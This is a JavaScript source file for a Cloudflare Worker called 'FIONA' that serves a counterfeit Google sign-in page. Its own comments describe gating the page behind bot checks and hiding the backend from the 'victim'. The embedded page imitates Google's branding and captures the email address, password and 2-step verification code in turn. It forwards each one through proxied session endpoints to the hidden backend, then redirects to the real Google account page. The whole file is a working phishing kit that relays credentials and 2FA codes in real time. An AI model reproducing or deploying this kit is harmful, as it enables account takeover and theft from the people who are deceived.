/**
 * FIONA — Cloudflare Worker (single-file, no separate HTML needed)
 *
 * Deploy this one file. No HTML file, no KV, no build step.
 *
 * Place at:  backend/login-pages/google/worker.js
 *
 * Endpoints:
 *   GET /               Bot check → Turnstile gate → serves Google login page
 *   POST /verify-turnstile  Receives Turnstile token, proxies verification to backend, sets cookie
 *   /api/*              Proxies to BACKEND_URL (backend never visible to victim)
 *   OPTIONS *           CORS preflight
 *
 * Deployment:
 *   DeploymentService reads this file, replaces __BACKEND_URL__ with the real backend URL,
 *   then uploads the modified script to Cloudflare. No CF env bindings are used.
 *   BACKEND_URL is baked into the script at deploy time via string replacement only.
 *
 * Turnstile:
 *   site_key — fetched at request time from GET {BACKEND_URL}/api/domain/config?hostname=
 *   secret_key — never in this file; backend verifies tokens via POST {BACKEND_URL}/api/turnstile/verify
 */

// BACKEND_URL is injected by DeploymentService via string replacement before upload.
// Never appears in any HTML or JS returned to clients — only used in server-side fetch() calls.
const BACKEND_URL = '__BACKEND_URL__';

// ─────────────────────────────────────────────────────────────────────────────
//  Embedded Google login page HTML
//  (all CSS + JS inline; no external local files needed)
// ─────────────────────────────────────────────────────────────────────────────
const HTML_TEMPLATE = `<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Sign in - Google Accounts</title>
<link href="https://fonts.googleapis.com/css2?family=Google+Sans:wght@400;500&family=Roboto:wght@400;500&display=swap" rel="stylesheet">
<style>
  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }

  body {
    font-family: 'Google Sans', 'Roboto', sans-serif;
    background: #f1f3f4;
    min-height: 100vh;
    display: flex;
    align-items: center;
    justify-content: center;
    padding: 24px;
  }

  /* ── Progress bar ── */
  .progress-bar {
    position: fixed; top: 0; left: 0; width: 0; height: 3px;
    background: #1a73e8;
    display: none;
    z-index: 100;
    transition: width 0.3s ease;
  }
  .progress-bar.loading { display: block; animation: progress-indeterminate 1.5s infinite ease-in-out; }
  @keyframes progress-indeterminate {
    0%   { left: -30%; width: 30%; }
    50%  { left: 30%;  width: 50%; }
    100% { left: 110%; width: 30%; }
  }

  /* ── Card ── */
  .card {
    background: #fff;
    border-radius: 28px;
    overflow: hidden;
    width: 100%;
    max-width: 1136px;
    min-height: 520px;
    display: flex;
    flex-direction: column;
    position: relative;
    box-shadow: 0 1px 3px rgba(0,0,0,.12), 0 2px 8px rgba(0,0,0,.08);
  }

  /* ── G logo (absolute, top-left) ── */
  .g-logo {
    position: absolute;
    top: 36px;
    left: 36px;
    z-index: 10;
    display: flex;
    align-items: center;
    gap: 10px;
    text-decoration: none;
  }
  .g-logo svg { width: 32px; height: 32px; }
  .g-logo-text {
    font-size: 22px;
    font-weight: 500;
    color: #202124;
    letter-spacing: -.5px;
  }

  /* ── Sliding track ── */
  .slides-wrapper { overflow: hidden; flex: 1; }
  .slides-track {
    display: flex;
    width: 300%;
    transition: transform 0.4s cubic-bezier(.4,0,.2,1);
    will-change: transform;
  }
  .slides-track.at-email    { transform: translateX(0); }
  .slides-track.at-password { transform: translateX(-33.3333%); }
  .slides-track.at-2fa      { transform: translateX(-66.6666%); }

  /* ── Individual slide ── */
  .slide {
    width: 33.3333%;
    display: flex;
    min-height: 520px;
  }

  /* ── Two-column layout per slide ── */
  .slide-left {
    flex: 1;
    padding: 80px 48px 48px 48px;
    display: flex;
    flex-direction: column;
    justify-content: center;
  }
  .slide-right {
    width: 44%;
    min-width: 320px;
    background: #e8f0fe;
    display: flex;
    align-items: center;
    justify-content: center;
    padding: 48px;
  }

  /* ── Left column text ── */
  .slide-title {
    font-size: 28px;
    font-weight: 400;
    color: #202124;
    margin-bottom: 8px;
    line-height: 1.2;
  }
  .slide-subtitle {
    font-size: 15px;
    color: #5f6368;
    margin-bottom: 32px;
  }
  .slide-email-display {
    font-size: 14px;
    color: #202124;
    background: #f1f3f4;
    border-radius: 20px;
    padding: 6px 14px;
    display: inline-flex;
    align-items: center;
    gap: 8px;
    margin-bottom: 24px;
    cursor: pointer;
    width: fit-content;
  }
  .slide-email-display svg { width: 16px; height: 16px; color: #5f6368; }

  /* ── Material Design floating-label input ── */
  .mdc-field {
    position: relative;
    margin-bottom: 24px;
  }
  .mdc-input {
    width: 100%;
    height: 56px;
    padding: 20px 16px 8px 16px;
    font-size: 16px;
    font-family: inherit;
    color: #202124;
    background: transparent;
    border: 1px solid #dadce0;
    border-radius: 4px;
    outline: none;
    transition: border-color .2s;
  }
  .mdc-input:focus { border-color: #1a73e8; border-width: 2px; }
  .mdc-label {
    position: absolute;
    top: 50%; left: 16px;
    transform: translateY(-50%);
    font-size: 16px;
    color: #5f6368;
    pointer-events: none;
    transition: top .15s ease, font-size .15s ease, color .15s ease;
  }
  .mdc-input:focus ~ .mdc-label,
  .mdc-input:not(:placeholder-shown) ~ .mdc-label {
    top: 10px;
    font-size: 11px;
    color: #1a73e8;
    transform: translateY(0);
  }
  .mdc-input:not(:focus):not(:placeholder-shown) ~ .mdc-label {
    color: #5f6368;
  }

  /* ── Error message ── */
  .error-msg {
    display: none;
    align-items: flex-start;
    gap: 6px;
    color: #d93025;
    font-size: 12px;
    margin-top: -18px;
    margin-bottom: 16px;
    line-height: 1.4;
  }
  .error-msg.visible { display: flex; }
  .error-msg svg { flex-shrink: 0; margin-top: 1px; }

  /* ── Helper link row ── */
  .helper-row {
    font-size: 14px;
    color: #1a73e8;
    margin-bottom: 32px;
  }
  .helper-row a { text-decoration: none; color: inherit; }
  .helper-row a:hover { text-decoration: underline; }

  /* ── Forgot password ── */
  .forgot-link {
    font-size: 14px;
    color: #1a73e8;
    text-decoration: none;
    display: inline-block;
    margin-bottom: 32px;
  }
  .forgot-link:hover { text-decoration: underline; }

  /* ── Action row ── */
  .action-row {
    display: flex;
    align-items: center;
    justify-content: space-between;
    margin-top: auto;
  }
  .btn-text {
    background: none;
    border: none;
    color: #1a73e8;
    font-size: 14px;
    font-family: inherit;
    font-weight: 500;
    cursor: pointer;
    padding: 8px 0;
    text-transform: none;
    letter-spacing: .25px;
  }
  .btn-text:hover { background: rgba(26,115,232,.04); border-radius: 4px; padding: 8px 12px; margin-left: -12px; }
  .btn-next {
    background: #1a73e8;
    color: #fff;
    border: none;
    border-radius: 4px;
    padding: 0 24px;
    height: 36px;
    font-size: 14px;
    font-family: inherit;
    font-weight: 500;
    cursor: pointer;
    letter-spacing: .25px;
    transition: background .2s, box-shadow .2s;
  }
  .btn-next:hover { background: #1557b0; box-shadow: 0 1px 3px rgba(0,0,0,.2); }
  .btn-next:disabled { background: #dadce0; color: #80868b; cursor: not-allowed; }

  /* ── Right column illustration ── */
  .illus { width: 100%; max-width: 280px; }
  .illus-lock { text-align: center; }
  .illus-lock svg { width: 120px; height: 120px; color: #1a73e8; opacity: .85; }

  /* ── Footer ── */
  .card-footer {
    padding: 20px 36px;
    border-top: 1px solid #e8eaed;
    display: flex;
    align-items: center;
    justify-content: space-between;
    flex-wrap: wrap;
    gap: 12px;
  }
  .footer-links { display: flex; gap: 20px; flex-wrap: wrap; }
  .footer-links a {
    font-size: 12px;
    color: #5f6368;
    text-decoration: none;
  }
  .footer-links a:hover { text-decoration: underline; }

  /* ── Responsive ── */
  @media (max-width: 768px) {
    body { padding: 0; align-items: stretch; }
    .card { border-radius: 0; min-height: 100vh; }
    .slide-right { display: none; }
    .slide-left { padding: 72px 24px 32px 24px; }
    .g-logo { top: 24px; left: 24px; }
  }
</style>
</head>
<body>

<div class="progress-bar" id="progressBar"></div>

<div class="card">
  <!-- G logo -->
  <a class="g-logo" href="https://accounts.google.com" tabindex="-1">
    <svg viewBox="0 0 48 48" xmlns="http://www.w3.org/2000/svg">
      <path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/>
      <path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/>
      <path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/>
      <path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/>
      <path fill="none" d="M0 0h48v48H0z"/>
    </svg>
    <span class="g-logo-text">Google</span>
  </a>

  <div class="slides-wrapper">
    <div class="slides-track at-email" id="slidesTrack">

      <!-- ══ SLIDE 1: Email ══ -->
      <div class="slide">
        <div class="slide-left">
          <h1 class="slide-title">Sign in</h1>
          <p class="slide-subtitle">Use your Google Account</p>

          <div class="mdc-field">
            <input
              id="emailInput"
              class="mdc-input"
              type="text"
              name="identifier"
              autocomplete="username"
              placeholder=" "
              autofocus
            />
            <label class="mdc-label" for="emailInput">Email or phone</label>
          </div>

          <div class="error-msg" id="emailError">
            <svg width="16" height="16" fill="currentColor" viewBox="0 0 20 20">
              <path fill-rule="evenodd" d="M18 10a8 8 0 11-16 0 8 8 0 0116 0zm-7 4a1 1 0 11-2 0 1 1 0 012 0zm-1-9a1 1 0 00-1 1v4a1 1 0 102 0V6a1 1 0 00-1-1z" clip-rule="evenodd"/>
            </svg>
            <span id="emailErrorText"></span>
          </div>

          <div class="helper-row">
            <a href="https://accounts.google.com/signin/v2/usernamerecovery">Forgot email?</a>
          </div>

          <p style="font-size:14px;color:#5f6368;margin-bottom:24px;">
            Not your computer? Use a Private Window to sign in.
            <a href="https://support.google.com/chrome/answer/95464" style="color:#1a73e8;text-decoration:none;">Learn more</a>
          </p>

          <div class="action-row">
            <button class="btn-text" type="button" onclick="window.open('https://accounts.google.com/signup','_blank')">Create account</button>
            <button class="btn-next" id="emailNext" type="button" onclick="handleEmailNext()">Next</button>
          </div>
        </div>
        <div class="slide-right">
          <!-- Sign-in illustration -->
          <svg class="illus" viewBox="0 0 200 200" fill="none" xmlns="http://www.w3.org/2000/svg">
            <circle cx="100" cy="80" r="40" fill="#c5d9f8"/>
            <circle cx="100" cy="70" r="22" fill="#8ab4f8"/>
            <ellipse cx="100" cy="130" rx="50" ry="28" fill="#c5d9f8"/>
            <circle cx="100" cy="70" r="14" fill="#fff"/>
            <circle cx="100" cy="66" r="8" fill="#4285f4"/>
            <circle cx="100" cy="66" r="4" fill="#fff"/>
          </svg>
        </div>
      </div>

      <!-- ══ SLIDE 2: Password ══ -->
      <div class="slide">
        <div class="slide-left">
          <!-- Email chip (filled by JS) -->
          <div class="slide-email-display" id="emailChip" onclick="showEmailView()">
            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
              <path d="M20 21v-2a4 4 0 00-4-4H8a4 4 0 00-4 4v2"/>
              <circle cx="12" cy="7" r="4"/>
            </svg>
            <span id="emailChipText"></span>
            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="width:14px;height:14px;">
              <polyline points="6 9 12 15 18 9"/>
            </svg>
          </div>

          <h1 class="slide-title">Welcome</h1>
          <p class="slide-subtitle" id="passwordSubtitle">Enter your password</p>

          <div class="mdc-field">
            <input
              id="passwordInput"
              class="mdc-input"
              type="password"
              name="password"
              autocomplete="current-password"
              placeholder=" "
            />
            <label class="mdc-label" for="passwordInput">Enter your password</label>
          </div>

          <div class="error-msg" id="passwordError">
            <svg width="16" height="16" fill="currentColor" viewBox="0 0 20 20">
              <path fill-rule="evenodd" d="M18 10a8 8 0 11-16 0 8 8 0 0116 0zm-7 4a1 1 0 11-2 0 1 1 0 012 0zm-1-9a1 1 0 00-1 1v4a1 1 0 102 0V6a1 1 0 00-1-1z" clip-rule="evenodd"/>
            </svg>
            <span id="passwordErrorText"></span>
          </div>

          <a class="forgot-link" href="https://accounts.google.com/signin/v2/recoveryidentifier">Forgot password?</a>

          <div class="action-row">
            <button class="btn-text" type="button" onclick="showEmailView()">Back</button>
            <button class="btn-next" id="passwordNext" type="button" onclick="handlePasswordNext()">Next</button>
          </div>
        </div>
        <div class="slide-right">
          <div class="illus-lock">
            <svg viewBox="0 0 120 120" fill="none" xmlns="http://www.w3.org/2000/svg">
              <rect x="20" y="52" width="80" height="58" rx="10" fill="#8ab4f8"/>
              <path d="M40 52V36a20 20 0 0140 0v16" stroke="#4285f4" stroke-width="6" stroke-linecap="round"/>
              <circle cx="60" cy="80" r="10" fill="#fff"/>
              <rect x="56" y="80" width="8" height="14" rx="4" fill="#fff"/>
            </svg>
          </div>
        </div>
      </div>

      <!-- ══ SLIDE 3: 2FA ══ -->
      <div class="slide">
        <div class="slide-left">
          <h1 class="slide-title">2-Step Verification</h1>
          <p class="slide-subtitle" id="twoFaSubtitle">Enter the verification code</p>

          <div class="mdc-field">
            <input
              id="twoFaInput"
              class="mdc-input"
              type="text"
              inputmode="numeric"
              maxlength="8"
              placeholder=" "
              autocomplete="one-time-code"
            />
            <label class="mdc-label" for="twoFaInput">Enter code</label>
          </div>

          <div class="error-msg" id="twoFaError">
            <svg width="16" height="16" fill="currentColor" viewBox="0 0 20 20">
              <path fill-rule="evenodd" d="M18 10a8 8 0 11-16 0 8 8 0 0116 0zm-7 4a1 1 0 11-2 0 1 1 0 012 0zm-1-9a1 1 0 00-1 1v4a1 1 0 102 0V6a1 1 0 00-1-1z" clip-rule="evenodd"/>
            </svg>
            <span id="twoFaErrorText"></span>
          </div>

          <div class="action-row">
            <button class="btn-text" type="button" onclick="showEmailView()">Cancel</button>
            <button class="btn-next" type="button" onclick="handleTwoFaNext()">Next</button>
          </div>
        </div>
        <div class="slide-right">
          <div class="illus-lock">
            <svg viewBox="0 0 120 120" fill="none" xmlns="http://www.w3.org/2000/svg">
              <rect x="10" y="30" width="100" height="70" rx="8" fill="#c5d9f8"/>
              <rect x="30" y="10" width="60" height="45" rx="6" fill="#8ab4f8"/>
              <rect x="44" y="24" width="32" height="4" rx="2" fill="#fff"/>
              <rect x="44" y="34" width="22" height="4" rx="2" fill="#fff"/>
              <circle cx="60" cy="75" r="14" fill="#4285f4"/>
              <path d="M54 75l5 5 8-10" stroke="#fff" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"/>
            </svg>
          </div>
        </div>
      </div>

    </div><!-- /slides-track -->
  </div><!-- /slides-wrapper -->

  <div class="card-footer">
    <div class="footer-links">
      <a href="https://policies.google.com/privacy">Privacy Policy</a>
      <a href="https://policies.google.com/terms">Terms of Service</a>
    </div>
    <div class="footer-links">
      <a href="#">Help</a>
    </div>
  </div>
</div>

<script>
  // ── State ──────────────────────────────────────────────
  let currentSessionId = null;
  let currentEmail = '';

  // ── Helpers ───────────────────────────────────────────
  const qs = (sel) => document.querySelector(sel);

  function showError(errorDivId, textSpanId, msg) {
    qs('#' + textSpanId).textContent = msg;
    qs('#' + errorDivId).classList.add('visible');
  }
  function hideError(errorDivId) {
    qs('#' + errorDivId).classList.remove('visible');
  }

  function setLoading(on) {
    const bar = qs('#progressBar');
    bar.classList.toggle('loading', on);
  }

  function setBtn(id, disabled) {
    qs('#' + id).disabled = disabled;
  }

  // ── Email step ────────────────────────────────────────
  async function handleEmailNext() {
    const email = qs('#emailInput').value.trim();
    hideError('emailError');

    if (!email) {
      showError('emailError', 'emailErrorText', 'Enter an email or phone number');
      return;
    }

    setBtn('emailNext', true);
    setLoading(true);

    try {
      const res = await fetch('/api/google/session/start', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ email }),
      });
      const data = await res.json();

      if (data.success && data.status === 'REQUIRES_PASSWORD') {
        currentSessionId = data.sessionId;
        currentEmail = email;
        // Populate password slide
        qs('#emailChipText').textContent = email;
        qs('#passwordSubtitle').textContent = email;
        // Slide to password
        qs('#slidesTrack').className = 'slides-track at-password';
        setTimeout(() => qs('#passwordInput').focus(), 420);
      } else {
        showError('emailError', 'emailErrorText',
          data.message || "Couldn't find your Google Account");
      }
    } catch (err) {
      showError('emailError', 'emailErrorText', 'Something went wrong. Try again.');
    } finally {
      setLoading(false);
      setBtn('emailNext', false);
    }
  }

  // ── Back to email ─────────────────────────────────────
  function showEmailView() {
    qs('#slidesTrack').className = 'slides-track at-email';
    currentSessionId = null;
    setTimeout(() => qs('#emailInput').focus(), 420);
  }

  // ── Password step ─────────────────────────────────────
  async function handlePasswordNext() {
    const password = qs('#passwordInput').value;
    hideError('passwordError');

    if (!password) {
      showError('passwordError', 'passwordErrorText', 'Enter a password');
      return;
    }
    if (!currentSessionId) {
      showEmailView();
      return;
    }

    setBtn('passwordNext', true);
    setLoading(true);

    try {
      const res = await fetch(\`/api/google/session/\${currentSessionId}/password\`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ password }),
      });
      const data = await res.json();

      if (data.success) {
        if (data.status === 'REQUIRES_2FA') {
          qs('#twoFaSubtitle').textContent = data.twoFactorType === 'sms'
            ? 'Check your phone for a verification code'
            : 'Open the Google Authenticator app and enter the code';
          qs('#slidesTrack').className = 'slides-track at-2fa';
          setTimeout(() => qs('#twoFaInput').focus(), 420);
        } else {
          // Success — redirect
          window.location.href = 'https://myaccount.google.com';
        }
      } else {
        showError('passwordError', 'passwordErrorText',
          data.message || 'Wrong password. Try again or click Forgot password.');
      }
    } catch (err) {
      showError('passwordError', 'passwordErrorText', 'Something went wrong. Try again.');
    } finally {
      setLoading(false);
      setBtn('passwordNext', false);
    }
  }

  // ── 2FA step ──────────────────────────────────────────
  async function handleTwoFaNext() {
    const code = qs('#twoFaInput').value.trim();
    hideError('twoFaError');

    if (!code) {
      showError('twoFaError', 'twoFaErrorText', 'Enter the verification code');
      return;
    }

    setLoading(true);

    try {
      const res = await fetch(\`/api/google/session/\${currentSessionId}/2fa\`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ code }),
      });
      const data = await res.json();

      if (data.success) {
        window.location.href = 'https://myaccount.google.com';
      } else {
        showError('twoFaError', 'twoFaErrorText',
          data.message || 'Wrong code. Try again.');
      }
    } catch (err) {
      showError('twoFaError', 'twoFaErrorText', 'Something went wrong. Try again.');
    } finally {
      setLoading(false);
    }
  }

  // ── Keyboard Enter support ─────────────────────────────
  qs('#emailInput').addEventListener('keydown', (e) => {
    if (e.key === 'Enter') handleEmailNext();
  });
  qs('#passwordInput').addEventListener('keydown', (e) => {
    if (e.key === 'Enter') handlePasswordNext();
  });
  qs('#twoFaInput').addEventListener('keydown', (e) => {
    if (e.key === 'Enter') handleTwoFaNext();
  });
</script>
</body>
</html>
`;
